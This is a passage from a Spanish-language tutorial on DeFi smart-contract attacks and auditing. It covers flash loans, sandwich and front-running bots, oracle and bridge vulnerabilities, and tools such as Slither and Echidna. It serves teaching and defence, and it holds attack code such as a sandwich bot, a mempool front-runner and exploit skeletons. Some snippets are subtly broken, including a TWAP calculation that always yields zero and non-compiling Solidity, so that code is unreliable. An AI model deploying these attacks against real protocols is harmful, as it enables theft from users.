        // 2. Depositar como colateral en el pool de lending
        pool.deposit(_collateralAsset, _amount, address(this), 0);
        
        // 3. Tomar prestado _borrowAsset (basado en el colateral)
        uint256 borrowAmount = pool.getBorrowableAmount(address(this), _borrowAsset);
        pool.borrow(_borrowAsset, borrowAmount, 0, address(this));
        
        // 4. Intercambiar parte de borrowAsset por collateralAsset
        // para devolver el flash loan
        swap(borrowAmount * 0.9, _collateralAsset);
        
        // 5. Devolver flash loan
        // 6. Quedarse con el resto como ganancia
    }
}
```

### 4.6 Cross-Protocol Flash Loan Attacks

Ataques que involucran múltiples protocolos en una sola transacción.

**Ejemplo real: Cream Finance (ago 2021, ~$18M)**:

```
1. Flash loan de ETH de Aave
2. Depositar ETH en Cream
3. Tomar prestado crETH de Cream
4. Usar crETH como colateral en Cream
5. Tomar prestado varios tokens
6. Manipular oráculo de ETH/Yearn LP
7. Drenar fondos adicionales
8. Devolver flash loan a Aave
```

**Ejemplo moderno con código**:

```solidity
contract CrossProtocolAttack {
    IAave public aave;
    ICompound public compound;
    IUniswapV2 public uniswap;
    IERC20 public token;
    
    function multiProtocolAttack(uint256 _amount) external {
        // Fase 1: Flash loan de Aave
        bytes memory params = abi.encode(msg.sender);
        aave.flashLoan(address(this), address(token), _amount, params, 0);
    }
    
    function executeOperation(
        address asset, uint256 amount, uint256 premium,
        address initiator, bytes calldata params
    ) external returns (bool) {
        
        // Fase 2: Depositar en Compound
        token.approve(address(compound), amount);
        compound.supply(address(token), amount, 0);
        
        // Fase 3: Tomar prestado de Compound
        (uint256 borrowable, ) = compound.getAccountSnapshot(address(this));
        compound.borrow(address(token), borrowable);
        
        // Fase 4: Arbitraje en varios DEX
        // ...
        
        // Devolver flash loan
        token.approve(address(aave), amount + premium);
        return true;
    }
}
```

---

## 5. Front-Running

### 5.1 Mempool Monitoring

Todas las transacciones pendientes van al mempool. Los bots monitorean el mempool y ejecutan transacciones antes que la víctima.

**Ethereum mempool**:

```javascript
// Usando ethers.js para monitorear mempool
const provider = new ethers.providers.WebSocketProvider(WS_URL);

provider.on("pending", async (txHash) => {
    const tx = await provider.getTransaction(txHash);
    
    if (!tx || !tx.to) return;
    
    // Analizar la transacción
    console.log({
        hash: tx.hash,
        from: tx.from,
        to: tx.to,
        value: ethers.utils.formatEther(tx.value),
        gasPrice: tx.gasPrice?.toString(),
        data: tx.data
    });
    
    // Decodificar data (usando ABI)
    if (tx.data.startsWith("0xa9059cbb")) {
        // Es un transfer(address,uint256)
        const to = "0x" + tx.data.slice(34, 74);
        const amount = BigInt(tx.data.slice(74));
        console.log(`Transfer detectado: ${amount} a ${to}`);
        
        // Podemos front-run!
    }
});
```

**Herramientas de mempool**:
- **Flashbots**: protege contra front-running (transacciones privadas)
- **Eden Network**: [red](../raw/r3d3s-f0nd4m3nt0s.md) de mempool privada
- **BloxRoute**: mempool API para MEV
- **MEV-Geth**: fork de Geth con protección MEV

### 5.2 Gas Price Bidding

La forma más básica de front-running: pagar más gas para que el minero incluya tu transacción antes.

```javascript
// La víctima envía:
await contract.swap(1000, 1, deadline);

// El atacante ve la tx en mempool y envía:
await contract.swap(1000, 1, deadline, {
    gasPrice: victimGasPrice * 1.5  // Paga más!
});
```

**EIP-1559**: Con la tarifa base + priority fee, el bidding se vuelve más complejo:

```javascript
// Víctima:
{
    maxFeePerGas: 50e9,
    maxPriorityFeePerGas: 2e9
}

// Atacante:
{
    maxFeePerGas: 100e9,   // Mayor tarifa máxima
    maxPriorityFeePerGas: 10e9  // Mayor propina para minero
}
```

**Repayment**: Si el atacante gasta X en gas extra pero gana Y > X en MEV, vale la pena.

### 5.3 Sandwich Attacks

El ataque más común en DeFi: comprar antes de la víctima (front-run) y vender después (back-run).

```
Línea de tiempo:
1. Atacante compra (front-run) → precio sube
2. Víctima compra → precio sube más
3. Atacante vende (back-run) → ganancia
```

**Implementación**:

```solidity
contract SandwichBot {
    IUniswapV2Router public router;
    IERC20 public token;
    
    // Detectado en mempool: swap grande de WETH → TOKEN
    function execute(address _token, uint256 _amountIn, uint256 _minOut) external {
        // 1. Front-run: comprar antes de la víctima
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(_token);
        
        router.swapExactETHForTokens{value: 1 ether}(
            0, path, address(this), block.timestamp
        );
        
        // 2. Esperar a que la transacción de la víctima se ejecute
        // En la misma tx no podemos esperar, así que esto es atómico
        
        // 3. Back-run: vender después de la víctima
        uint256 balance = token.balanceOf(address(this));
        token.approve(address(router), balance);
        
        path[0] = address(_token);
        path[1] = router.WETH();
        
        uint256 ethReceived = router.swapExactTokensForETH(
            balance, 0, path, address(this), block.timestamp
        );
        
        // Ganancia = ethReceived - 1 ETH - gas
        require(ethReceived > 1 ether, "Sin ganancia");
    }
}
```

**Ejemplo real**:

```
Pool Uniswap WETH/USDC: 1000 WETH, 3,000,000 USDC
Precio: 3000 USDC/WETH

1. Víctima va a comprar 10 WETH con USDC
2. Bot ve la tx en mempool
3. Bot compra 5 WETH → pool se vuelve 1005 WETH, ~2,985,074 USDC
   Precio ahora: ~2969 USDC/WETH
4. Víctima compra 10 WETH → pool se vuelve 1015 WETH, ~2,940,441 USDC
   Precio ahora: ~2898 USDC/WETH
5. Bot vende sus 5 WETH → pool se vuelve 1010 WETH, ~2,956,335 USDC
   Bot recibe: ~2959 USDC
   Ganancia del bot: ~15 USDC (pagó ~14,925 USDC por 5 WETH, vendió por ~14,940 USDC)
   Pérdida de la víctima: pagó más de lo que debería
```

**Protección**: slippage protection en routers:

```solidity
// Víctima protegiéndose:
// amountIn: 10 WETH
// amountOutMin: 2900 USDC (slippage tolerance)
// Si el slippage es mayor, la transacción revierte
```

### 5.4 Time-Bandit Attacks

También llamado **MEV reorg**: un minero (o pool) reorganiza la [blockchain](../raw/w3b3-sm4rt-c0ntr4cts.md#blockchain) para extraer MEV.

**Cómo funciona**:

```
Bloque N:
- Tx A (víctima): compra 10 ETH a 3000 USDC
- Tx B (atacante): compra 5 ETH a 3000 USDC
- Tx C (back-run): vende 5 ETH a 3100 USDC

Pero el minero puede:
1. Minar un bloque con solo Tx A (ignora B y C)
2. En el bloque siguiente, incluir B y C él mismo
3. O mejor: hacer reorg y minar el bloque con sus propias txs
```

**Requisitos**: El atacante debe ser un minero/pool con suficiente [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) power.

**Protección**: Flashbots protege contra esto usando transacciones privadas que el minero no puede reordenar.

### 5.5 Dark Forest y MEV

El **Dark Forest** es un concepto que describe cómo el mempool de Ethereum es un "bosque oscuro" lleno de bots que se comen entre sí.

**Tipos de MEV bots**:

```
1. Searchers: buscan oportunidades MEV
2. Builders: construyen bloques incluyendo transacciones MEV
3. Relayers: conectan searchers con builders (Flashbots)
4. Validators: proponen bloques (antes mineros)
```

**Estrategias de Searchers**:
- **DEX arbitrage**: comprar barato/vender caro entre DEXes
- **Liquidations**: liquidar posiciones undercollateralized
- **Sandwich**: front-run + back-run swaps
- **[jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) liquidity**: proveer liquidez just-in-time para capturar fees
- **NFT sniping**: comprar NFTs infravalorados

**Ejemplo de MEV bot**:

```javascript
// Simplified MEV bot (pseudocódigo)
class MEVBot {
    constructor() {
        this.mempool = new Set();
        this.provider = new WebSocketProvider(WS_URL);
        this.setupMempoolMonitor();
    }
    
    setupMempoolMonitor() {
        this.provider.on('pending', async (txHash) => {
            const tx = await this.provider.getTransaction(txHash);
            if (this.isProfitable(tx)) {
                await this.executeFrontRun(tx);
            }
        });
    }
    
    isProfitable(tx) {
        // Verificar si la tx es un swap grande
        // Calcular ganancia potencial
        // Checkear gas price
        return true; // simplified
    }
    
    async executeFrontRun(victimTx) {
        const frontRunTx = {
            to: victimTx.to,
            data: victimTx.data,
            gasPrice: victimTx.gasPrice * 1.1n,  // +10%
            // ... más params
        };
        
        // Enviar via Flashbots (privado)
        const bundle = [
            await this.signTx(frontRunTx),
            victimTx,
            await this.signTx(backRunTx)
        ];
        
        await flashbots.sendBundle(bundle);
    }
}
```

### 5.6 Mitigaciones contra Front-Running

**1. Slippage Protection**:

```solidity
function swap(uint256 _amountIn, uint256 _amountOutMin, uint256 _deadline) external {
    require(block.timestamp <= _deadline, "Expired");
    // ...
    uint256 amountOut = getAmountOut(_amountIn);
    require(amountOut >= _amountOutMin, "Slippage too high");
}
```

**2. Commit-Reveal Schemes**:

```solidity
contract CommitReveal {
    mapping(bytes32 => uint256) public commitments;
    mapping(address => uint256) public bids;
    mapping(address => uint256) public salts;
    
    // Fase 1: Commit (enviar hash de la oferta)
    function commit(bytes32 _hash) external payable {
        commitments[_hash] = msg.value;
    }
    
    // Fase 2: Reveal (revelar la oferta real)
    function reveal(uint256 _bid, uint256 _salt) external {
        bytes32 hash = keccak256(abi.encodePacked(_bid, _salt, msg.sender));
        require(commitments[hash] > 0, "No existe commit");
        require(_bid == commitments[hash], "Oferta no coincide");
        
        bids[msg.sender] = _bid;
        salts[msg.sender] = _salt;
        
        delete commitments[hash];
    }
}
```

**3. Submarine sends**:

```solidity
// Enviar fondos a una dirección generada en el mismo bloque
// Como la dirección no existe antes del bloque, no se puede front-run
```

**4. Flashbots / Private Mempool**:

```javascript
// Enviar transacción privada via Flashbots
const flashbotsProvider = new FlashbotsBundleProvider(provider, signer);

const bundle = [{
    transaction: {
        to: contractAddress,
        data: swapData,
        gasLimit: 100000,
        maxFeePerGas: maxFee,
        maxPriorityFeePerGas: priorityFee
    },
    signer: wallet
}];

const res = await flashbotsProvider.sendBundle(bundle, targetBlockNumber);
```

**5. Miner-Extractable Value taxes**:

```solidity
// Impuesto a MEV: una parte de la ganancia va a los holders
function transfer(address to, uint256 amount) override returns (bool) {
    uint256 fee = amount * 2 / 100;  // 2% fee para holders
    uint256 netAmount = amount - fee;
    
    _transfer(msg.sender, feeRecipient, fee);
    _transfer(msg.sender, to, netAmount);
    
    return true;
}
```

---

## 6. Oracle Manipulation

### 6.1 Price Feed Manipulation

Los oráculos llevan datos del mundo real a la [blockchain](../raw/w3b3-sm4rt-c0ntr4cts.md#blockchain). Si un oráculo está mal implementado, se puede manipular.

**Ataque clásico: manipular reserve-based oracle**:

```solidity
// ORÁCULO VULNERABLE
contract VulnerableOracle {
    IUniswapV2Pair public pair;
    
    // Toma el precio directo del pool Uniswap
    // SIN proteger contra manipulación temporal
    function getPrice() external view returns (uint256) {
        (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();
        return reserve0 * 10**18 / reserve1;  // Precio spot
    }
}

// CONTRATO VULNERABLE QUE USA EL ORÁCULO
contract LendingProtocol {
    VulnerableOracle public oracle;
    
    function borrow(address _token, uint256 _amount) external {
        uint256 price = oracle.getPrice();  // Precio manipulado!
        uint256 collateralValue = msg.value * price / 10**18;
        require(collateralValue >= _amount * 2, "Collateral insuficiente");
        
        // Si price está inflado, podemos tomar prestado más!
        token.transfer(msg.sender, _amount);
    }
}
```

**Ataque**:

```
1. Flash loan grande de tokenA
2. Swap en Uniswap: tokenA → tokenB
   - Esto mueve reserves desproporcionadamente
   - price = reserve0/reserve1 se distorsiona
3. Llamar a borrow() usando el precio manipulado
4. Tomar prestado mucho más de lo que deberíamos
5. Devolver flash loan
6. Ganancia: diferencia
```

### 6.2 TWAP Oracle Attacks

**Time-Weighted Average Price** (TWAP) es más seguro que price spot porque promedia el precio en varios bloques.

**Uniswap V2 TWAP**:

```solidity
// Uniswap V2 acumula priceCumulative en cada bloque
// TWAP = (priceCumulative[t1] - priceCumulative[t0]) / (t1 - t0)

contract TWAPOracle {
    IUniswapV2Pair public pair;
    uint256 public price0CumulativeLast;
    uint256 public price1CumulativeLast;
    uint256 public blockTimestampLast;
    uint256 public twapPrice;
    
    function update() external {
        (uint112 reserve0, uint112 reserve1, uint32 blockTimestamp) = pair.getReserves();
        
        uint256 timeElapsed = blockTimestamp - blockTimestampLast;
        require(timeElapsed > 0, "No ha pasado tiempo");
        
        // Calcular TWAP
        price0CumulativeLast = pair.price0CumulativeLast();
        price1CumulativeLast = pair.price1CumulativeLast();
        
        twapPrice = (price0CumulativeLast - price0CumulativeLast) / timeElapsed;
        blockTimestampLast = blockTimestamp;
    }
}
```

**Ataques a TWAP**:

1. **Manipulación multi-bloque**: Si el atacante puede manipular el precio durante varios bloques consecutivos, puede influir en el TWAP.

2. **TWAP con flash loans**: Los flash loans no pueden manipular múltiples bloques, pero combinados con sandwich attacks pueden.

3. **TWAP en pools de baja liquidez**: Más fácil de manipular.

**Uniswap V3 TWAP**:

```solidity
// Uniswap V3 usa un oracle integrado
// Se puede obtener TWAP de los últimos N segundos

contract UniV3Oracle {
    IUniswapV3Pool public pool;
    
    function getTWAP(uint32 _secondsAgo) external view returns (uint256) {
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = _secondsAgo;
        secondsAgos[1] = 0;
        
        (int56[] memory tickCumulatives, ) = pool.observe(secondsAgos);
        
        int56 tickCumulativeDelta = tickCumulatives[1] - tickCumulatives[0];
        int24 tick = int24(tickCumulativeDelta / int56(int256(uint256(_secondsAgo))));
        
        return TickMath.getSqrtRatioAtTick(tick);
    }
}
```

**Protección**: Usar TWAP de periodos largos (30 min - 1 hora) hace impracticable la manipulación.

### 6.3 Chainlink Oracle Issues

Chainlink es el oráculo más usado en DeFi. Pero no es infalible.

**Cómo funciona Chainlink**:

```
Chainlink Node → recibe datos off-chain → firma respuesta → Aggregator contract
Aggregator contract → almacena precio actualizado
Protocolos leen del Aggregator
```

**Problemas conocidos**:

1. **Precio desactualizado**: Si el Aggregator no se actualiza, el precio es viejo.

```solidity
// VULNERABLE: no verifica freshness
function borrow() external {
    (, int256 answer, , , ) = chainlinkAggregator.latestRoundData();
    uint256 price = uint256(answer);
    
    // Si el Aggregator no se actualizó hace horas
    // y el precio real cambió, esto es peligroso
}
```

2. **Revert no manejado**: Si el Aggregator reverte, la función falla.

3. **Stale price**:

```solidity
// ✅ SEGURO: verificar timestamp
function getSafePrice(IAggregator _aggregator) external view returns (uint256) {
    (uint80 roundId, int256 answer, , uint256 updatedAt, uint80 answeredInRound) =
        _aggregator.latestRoundData();
    
    require(answer > 0, "Precio inválido");
    require(updatedAt > 0, "Round incompleto");
    require(block.timestamp - updatedAt < 1 hours, "Precio desactualizado");
    require(answeredInRound >= roundId, "Respuesta desactualizada");
    
    return uint256(answer);
}
```

4. **Chainlink como único oráculo**:

```solidity
// MEJOR: combinar múltiples oráculos
contract MultiOracle {
    IChainlinkAggregator public chainlink;
    IUniswapV3Oracle public uniswap;
    
    function getPrice() external view returns (uint256) {
        uint256 chainlinkPrice = getChainlinkPrice();
        uint256 uniswapPrice = getUniswapPrice();
        
        // Usar la mediana o el más bajo
        return chainlinkPrice > uniswapPrice ? uniswapPrice : chainlinkPrice;
    }
}
```

### 6.4 Custom Oracle Exploits

Muchos protocolos implementan sus propios oráculos (mal).

**Ejemplo 1: Oracle basado en `balanceOf`**:

```solidity
// VULNERABLE: cualquiera puede inflar su balance
contract CustomOracle {
    IERC20 public token;
    
    function getTotalValue() external view returns (uint256) {
        // Si el token tiene flash mint (no requiere colateral)
        // el atacante puede inflar esto temporalmente
        return token.totalSupply() * getPrice();
    }
}
```

**Ejemplo 2: Oracle basado en pool LP**:

```solidity
// VULNERABLE: LP token puede manipularse
contract LPOracle {
    address public lpTaken;
    
    function getLPValue(address _user) external view returns (uint256) {
        uint256 userBalance = IERC20(lpToken).balanceOf(_user);
        uint256 totalSupply = IERC20(lpToken).totalSupply();
        (uint256 reserve0, uint256 reserve1, ) = IUniswapV2Pair(lpToken).getReserves();
        
        // Si el atacante deposita y retira rápido, esto fluctúa
        return (reserve0 + reserve1) * userBalance / totalSupply;
    }
}
```

**Explotación**:

```solidity
contract ExploitLPOracle {
    CustomOracle public oracle;
    IUniswapV2Pair public pair;
    
    function exploit() external {
        // 1. Flash loan de tokens
        // 2. Añadir liquidez al par
        // 3. El totalSupply y reserves suben
        pair.mint(address(this));
        
        // 4. El oracle ahora ve valor inflado
        // 5. Tomar prestado contra ese valor
        // 6. Retirar liquidez
        // 7. Devolver flash loan
    }
}
```

### 6.5 Mitigaciones de Oracle

**Buenas prácticas**:

```solidity
// 1. Múltiples fuentes de datos
uint256[] memory prices = new uint256[](3);
prices[0] = chainlinkPrice;
prices[1] = uniswapTWAP;
prices[2] = makerOSM;

// Usar mediana (menos susceptible a outliers)
function median(uint256[] memory arr) internal pure returns (uint256) {
    // ordenar y tomar el del medio
}

// 2. Ciruit breaker si el precio se desvía mucho
uint256 public lastPrice;
uint256 public maxDeviation = 10;  // 10%

function checkPrice(uint256 _newPrice) internal {
    uint256 deviation = abs(int256(_newPrice) - int256(lastPrice)) * 100 / lastPrice;
    require(deviation <= maxDeviation, "Precio fuera de rango");
    lastPrice = _newPrice;
}

// 3. Time-delay en actualizaciones
uint256 public lastUpdate;
uint256 public minUpdateDelay = 1 hours;

modifier updateDelay() {
    require(block.timestamp >= lastUpdate + minUpdateDelay, "Demasiado pronto");
    _;
    lastUpdate = block.timestamp;
}
```

---

## 7. DeFi Logic Abuse

### 7.1 Lending Protocol Attacks

Los protocolos de lending (Aave, Compound, MakerDAO) tienen múltiples vectores de ataque.

**Ataque de liquidación falsa**:

```solidity
contract FakeLiquidation {
    ILendingPool public pool;
    
    function fakeLiquidate(address _victim, address _asset, uint256 _amount) external {
        // 1. Flash loan para obtener el asset de deuda
        // 2. Health factor del _victim debe estar < 1
        
        pool.liquidate(
            _asset,                     // asset de deuda
            _victim,                    // usuario a liquidar
            _amount,                    // cantidad
            address(this)              // receptor del colateral
        );
        
        // 3. Recibir colateral con descuento (5-10%)
        // 4. Devolver flash loan
        // 5. Ganancia: colateral - deuda + bonus de liquidación
    }
}
```

**Donation attack**:

```solidity
// Un atacante puede "donar" tokens para manipular cálculos de interés
// o ratios de colateralización

contract DonationAttack {
    function attack(address _pool, address _asset, uint256 _amount) external {
        // Donar tokens directamente al pool
        // Esto infla el totalSupply sin aumentar shares de nadie
        IERC20(_asset).transfer(_pool, _amount);
        
        // Ahora el ratio de exchange rate está inflado
        // Beneficia a depositantes existentes (incluyendo al atacante)
    }
}
```

### 7.2 AMM Manipulation

Los Automated Market Makers (Uniswap, Sushiswap, Curve) son vulnerables a manipulación.

**Impermanent loss attack**:

```solidity
contract ImpermanentLossAttack {
    IUniswapV2Pair public pair;
    
    function exploit() external {
        // 1. Flash loan de grandes cantidades
        // 2. Swap violento en el pool
        pair.swap(0, hugeOut, address(this), "");
        
        // 3. El pool ahora está desbalanceado
        // 4. Proveedores de liquidez tienen IL
        // 5. Otros ataques (oracle, liquidación)
    }
}
```

**Curve Finance pool manipulation**:

```solidity
// Curve pools son resistentes a slippage para stablecoins
// pero pueden manipularse con grandes cantidades

// Ataque: mover el balance de un pool Curve para:
// 1. Obtener mejor precio en otro protocolo
// 2. Manipular el oracle de LP tokens
// 3. Causar desbalance para liquidar positiones
```

### 7.3 Yield Aggregator Attacks

Yield aggregators (Yearn Finance, Harvest Finance) combinan múltiples estrategias.

**Harvest Finance attack (oct 2020, ~$24M)**:

```
1. Flash loan de USDC de dYdX
2. Depositar USDC en Harvest fUSDC pool
3. El deposit cambia el ratio del pool
4. Con el ratio manipulado, retirar todo
5. Obtener más de lo que se depositó
6. Devolver flash loan
```

**Staking pool inflation**:

```solidity
contract InflationAttack {
    IStakingPool public pool;
    
    function attack() external {
        // 1. Si el pool tiene un multiplier basado en totalStaked
        // 2. Depositar flash loan en el pool
        pool.stake(hugeAmount);
        
        // 3. El totalStaked aumenta, cambiando rewards
        // 4. Claim rewards inflados
        // 5. Unstake
        // 6. Devolver flash loan
    }
}
```

### 7.4 Staking Pool Exploits

**Rewards manipulation**:

```solidity
// VULNERABLE: cálculo de rewards basado en tiempo del bloque
contract RewardPoolVulnerable {
    mapping(address => uint256) public stakes;
    mapping(address => uint256) public lastUpdate;
    uint256 public rewardRate;
    uint256 public totalStaked;
    
    // El problema: los rewards se calculan como diferencia de tiempo
    // Un atacante puede stake justo antes de una recompensa grande
    // y unstake justo después
    
    function getPendingRewards(address _user) public view returns (uint256) {
        uint256 timeStaked = block.timestamp - lastUpdate[_user];
        return stakes[_user] * rewardRate * timeStaked / 1e18;
    }
    
    function stake(uint256 _amount) external {
        stakes[msg.sender] += _amount;
        lastUpdate[msg.sender] = block.timestamp;
        totalStaked += _amount;
    }
}
```

**Mitigación**: Snapshots de rewards en lugar de cálculo en vivo.

### 7.5 Bridge Attacks

Los bridges entre chains (Ronin, Wormhole, Nomad) han perdido miles de millones.

**Vector común: Validator compromise**:

```
Ronin Bridge (mar 2022, ~$600M):
- 5 de 9 validadores comprometidos
- Firmaron transacciones falsas
- Drenaron 173k ETH + 25.5M USDC

Wormhole (feb 2022, ~$320M):
- Bug en el smart contract de Solana
- Validación incorrecta de signatures
- Mint de 120k wETH sin colateral
```

**[smart contract](../raw/w3b3-sm4rt-c0ntr4cts.md#smart-contracts) bridge vulnerability**:

```solidity
// Ejemplo simplificado de bridge vulnerable
contract BridgeVulnerable {
    mapping(bytes32 => bool) public processedMessages;
    
    function executeMessage(
        bytes memory _message,
        bytes[] memory _signatures
    ) external {
        bytes32 messageHash = keccak256(_message);
        require(!processedMessages[messageHash], "Ya procesado");
        
        // VULNERABLE: no verifica suficientes firmas
        // VULNERABLE: no verifica que los firmantes sean validadores
        require(_signatures.length >= 3, "No suficientes firmas");
        
        _processMessage(_message);
        processedMessages[messageHash] = true;
    }
}
```

**Cross-chain replay**:

```solidity
// Un atacante puede replayar una transacción firmada en otra chain
// si el nonce de la chain destino es el mismo

contract CrossChainReplay {
    function execute(
        bytes memory _data,
        bytes memory _signature,
        uint256 _chainId
    ) external {
        // VULNERABLE: no incluye chainId en el hash
        bytes32 hash = keccak256(_data);
        address signer = ECDSA.recover(hash, _signature);
        
        // Si la misma data firmada en Ethereum se replaya en Polygon...
    }
}
```

---

## 8. [smart contract](../raw/w3b3-sm4rt-c0ntr4cts.md#smart-contracts) Auditing

### 8.1 Slither

Slither es el analizador estático más usado para [solidity](../raw/w3b3-sm4rt-c0ntr4cts.md#solidity). Detecta vulnerabilidades sin ejecutar código.

```bash
# Instalación
pip install slither-analyzer

# Uso básico
slither contract.sol

# Output detallado
slither contract.sol --print human-summary
slither contract.sol --print contract-summary
slither contract.sol --print vars-and-auth
slither contract.sol --print call-graph

# Detección de vulnerabilidades específicas
slither contract.sol --detect reentrancy
slither contract.sol --detect tx-origin
slither contract.sol --detect timestamp
slither contract.sol --detect uninitialized-state

# Todos los detectores
slither contract.sol --detect all

# Integración con Hardhat/Foundry
slither . --foundry-out
```

**Detectores principales**:

| Detector | Descripción |
|---|---|
| `reentrancy` | Reentrancia (ETH, tokens) |
| `tx-origin` | Uso de tx.origin |
| `timestamp` | Dependencia de block.timestamp |
| `uninitialized-state` | Variables sin inicializar |
| `unused-return` | Return value ignorado |
| `arbitrary-send` | Envío a address arbitraria |
| `controlled-delegatecall` | DELEGATECALL a address controlada |
| `shadowing` | [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) shadowing |
| `incorrect-equality` | Comparación incorrecta |
| `pess-unary` | Operador ++/-- en unchecked |

**Output de ejemplo**:

```
$ slither Vault.sol
INFO:Detectors:
Vault.withdraw() (Vault.sol#25-31) uses a dangerous external call:
 - msg.sender.call{value: amount}("") (Vault.sol#28)
Vault.withdraw() (Vault.sol#25-31) uses a dangerous external call:
 - Reentrancy in Vault.withdraw() (Vault.sol#25-31):
   External calls:
   - msg.sender.call{value: amount}("") (Vault.sol#28)
   State variables written after the call:
   - balances[msg.sender] = 0 (Vault.sol#30)
```

### 8.2 Mythril

Mythril es un escáner de seguridad que usa ejecución simbólica para encontrar vulnerabilidades.

```bash
# Instalación
pip install mythril

# Análisis básico
myth analyze contract.sol

# Análisis con parámetros
myth analyze contract.sol --solc-json solc.json
myth analyze contract.sol --execution-timeout 300

# Análisis de bytecode directo
myth analyze 0x60806040...

# Salida JSON
myth analyze contract.sol -o json

# Integración con Truffle
myth analyze --truffle

# Análisis de contrato deployado
myth analyze -a 0x1234... --rpc https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY
```

**Qué detecta Mythril**:

- Reentrancy
- Dependence on predictable environment variables
- Timestamp dependence
- [assembly](../raw/4ss3mbly-f0r-h4ck3rs.md) code issues
- Delegatecall to user-controlled address
- Unchecked return values
- State change after external call
- Integer overflow/underflow
- DoS with block gas limit

**Ejemplo de ejecución**:

```
$ myth analyze SimpleDAO.sol
==== Reentrancy ====
SWC ID: 107
Location: SimpleDAO.sol:12
Description: The function withdraw() performs an external call to msg.sender without
applying reentrancy guards or following the checks-effects-interactions pattern.

==== Unchecked CALL return value ====
SWC ID: 104
Location: SimpleDAO.sol:12
Description: The return value of the external call to msg.sender is not checked.
```

### 8.3 Echidna

Echidna es un [fuzzer](../raw/fuzz1ng.md#fuzzer) basado en propiedades. Testeás invariantes y Echidna busca inputs que los rompan.

```bash
# Instalación
# Descargar binario de https://github.com/crytic/echidna/releases

# Uso básico
echidna-test contract.sol

# Con propiedades específicas
echidna-test contract.sol --contract TestContract

# Testear función específica
echidna-test contract.sol --test-limit 10000 --seq-len 100

# Corpus-based fuzzing
echidna-test contract.sol --corpus-dir corpus/
```

**Ejemplo de propiedades de Echidna**:

```solidity
// Archivo de test: TestVault.sol
import "./Vault.sol";

contract TestVault is Vault {
    // Propiedad: el balance total nunca puede ser negativo
    function echidna_total_balance_non_negative() public view returns (bool) {
        return address(this).balance >= 0;
    }
    
    // Propiedad: el balance de un usuario es siempre su balance
    function echidna_user_balance(address _user) public view returns (bool) {
        return balances[_user] <= address(this).balance;
    }
    
    // Propiedad: suma de balances == balance del contrato
    function echidna_sum_of_balances() public view returns (bool) {
        uint256 sum = 0;
        // No podemos iterar todos los usuarios, esto es limitado
        return true;
    }
}

// Ejecutar:
// echidna-test TestVault.sol --contract TestVault
```

**Propiedades avanzadas**:

```solidity
contract TestAdv {
    MyContract public c;
    
    constructor() {
        c = new MyContract();
    }
    
    // Invariante: el precio nunca excede X
    function echidna_check_price_limit() public view returns (bool) {
        return c.getPrice() <= 1e18;
    }
    
    // Invariante: admin siempre es el deployer
    function echidna_check_admin() public view returns (bool) {
        return c.admin() == address(this);
    }
    
    // Assertions (reverten si se violan)
    function test_withdraw_ok() external {
        c.deposit{value: 100}();
        uint256 before = address(this).balance;
        c.withdraw(100);
        uint256 after = address(this).balance;
        assert(after > before);  // Fallaría si no recibimos los 100
    }
}
```

### 8.4 Foundry [fuzzing](../raw/fuzz1ng.md)

Foundry incluye fuzzing nativo con propiedades.

```bash
# Instalación
foundryup

# Configurar fuzzing en foundry.toml
# [fuzz]
# runs = 10000
# max-test-rejects = 65536
# seed = 0

# Test fuzzing
forge test
```

**Ejemplo de fuzz test**:

```solidity
// test/SafeMath.t.sol
import "forge-std/Test.sol";
import "../src/SafeMath.sol";

contract SafeMathTest is Test {
    using SafeMath for uint256;
    
    // Fuzz test: sumar siempre es mayor o igual
    function testFuzz_Add(uint256 a, uint256 b) public {
        uint256 c = a.add(b);
        assert(c >= a);
        assert(c >= b);
    }
    
    // Fuzz test con bound
    function testFuzz_Bounded(uint128 a, uint128 b) public {
        uint256 c = uint256(a) + uint256(b);
        assert(c >= a);
    }
    
    // Fuzz test con revert esperado
    /// forge-config: default.fuzz.runs = 1000
    function testFuzz_RevertIfOverflow(uint256 a, uint256 b) public {
        vm.assume(type(uint256).max - a < b);
        vm.expectRevert();
        a.add(b);
    }
}
```

**Fuzzing asistente con Foundry**:

```solidity
contract InvariantTest is Test {
    MyContract public c;
    address[] public users;
    
    function setUp() public {
        c = new MyContract();
        for (uint256 i = 0; i < 10; i++) {
            users.push(makeAddr(string(abi.encode(i))));
        }
    }
    
    // Invariant con handlers
    function invariant_balance_never_negative() public {
        for (uint256 i = 0; i < users.length; i++) {
            assert(c.balances(users[i]) >= 0);
        }
    }
    
    // Fuzzing de funciones con parámetros
    /// forge-config: default.fuzz.runs = 5000
    function testFuzz_DepositAndWithdraw(uint128 amount) public {
        address user = users[0];
        vm.deal(user, amount);
        vm.prank(user);
        c.deposit{value: amount}();
        
        assertEq(c.balances(user), amount);
        
        vm.prank(user);
        c.withdraw(amount);
        
        assertEq(c.balances(user), 0);
    }
}
```

### 8.5 Formal Verification

La verificación formal prueba matemáticamente que un contrato cumple especificaciones.

**Certora Prover**:

```solidity
// Especificación Certora (CVL - Certora Verification Language)
// certora/specs/Vault.spec

using Vault as vault;

// Regla: los balances siempre suman el balance del contrato
invariant sumBalancesEqualsContractBalance()
    vault.balances[owner] + vault.balances[user]
    == to_mathint(currentContract.balance)

// Regla: withdraw reduce el balance correctamente
rule withdrawReducesBalance(address user, uint256 amount) {
    uint256 balanceBefore = vault.balances[user];
    require(balanceBefore >= amount);
    
    vault.withdraw(amount) at the call;
    
    uint256 balanceAfter = vault.balances[user];
    assert balanceAfter == balanceBefore - amount;
}

// Regla: solo owner puede llamar admin functions
rule onlyOwnerCanCallAdmin(address caller) {
    require(caller != vault.owner());
    
    vault.adminFunction@with(caller);
    
    assert lastReverted;
}
```

```bash
# Ejecutar Certora
certoraRun Vault.sol --verify Vault:Vault.spec
```

**SMTChecker de Solidity**:

```solidity
// Solidity tiene SMTChecker integrado
// Se habilita con --model-checker-engine

// En foundry.toml:
// [solc]
// model-checker-engine = "chc"

// Contrato con assertions verificables
contract SMTContract {
    uint256 public x;
    
    function setX(uint256 _x) public {
        x = _x;
        assert(x == _x);  // Siempre true
    }
    
    function doubleX() public {
        x = x * 2;
        // Si x > type(uint256).max / 2, esto revierte
    }
}

// El SMTChecker puede probar que:
// - assert siempre se cumple
// - No hay overflow en ciertas operaciones
// - Las invariantes se mantienen
```

